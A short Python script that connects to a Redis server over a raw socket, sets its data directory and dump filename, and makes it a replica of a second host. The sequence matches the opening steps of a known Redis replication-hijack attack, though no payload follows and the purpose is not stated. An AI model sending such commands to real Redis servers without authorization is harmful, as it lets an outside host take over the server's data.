import socket
with socket.create_connection(("192.0.2.1", 6379)) as connection:
    connection.sendall(b"CONFIG SET dir /var/lib/redis\r\n")
    connection.sendall(b"CONFIG SET dbfilename dump.rdb\r\n")
    connection.sendall(b"REPLICAOF 192.0.2.2 6379\r\n")
